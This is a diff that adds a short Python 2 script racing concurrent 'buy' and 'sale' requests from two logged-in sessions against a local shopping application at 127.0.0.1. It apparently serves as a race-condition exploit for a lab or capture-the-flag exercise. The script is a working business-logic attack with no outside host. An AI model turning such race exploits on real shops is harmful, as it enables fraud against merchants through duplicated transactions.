@@ -154,3 +154,48 @@ for i in range(0,10000):
 	sales1()
 
 # 	
+
+
+
+
+import requests
+import threading
+import time
+r1 = requests.session()
+r2 = requests.session()
+
+def login(req,data):
+	r = req.post('http://127.0.0.1/shopping/login.php?XDEBUG_SESSION_START=1',data=data)
+	# print r.content
+
+def buy(req):
+	r = req.post('http://127.0.0.1/shopping/opt.php?name=article6&action=buy')
+	print r.content
+
+
+def sale(req):
+	r = req.post('http://127.0.0.1/shopping/opt.php?name=article6&action=sale')
+	print r.content
+
+if __name__ == '__main__':
+	data={
+	'sub':'Login',
+	'username':'heheda',
+	'password':'1'
+	}
+	login(r1, data)
+	login(r2, data)
+	# buy(r1)
+	while 1:
+		threading.Thread(target=buy, args=(r1,)).start()
+		threading.Thread(target=buy, args=(r2,)).start()
+		# buy(r1)
+		time.sleep(1)
+		# threading.Thread(target=sale_sses, args=(r2,)).start()
+		# threading.Thread(target=sale, args=(r2,)).start()
+		# threading.Thread(target=sale, args=(r1,)).start()
+		sale(r1)
+		
+
+
+
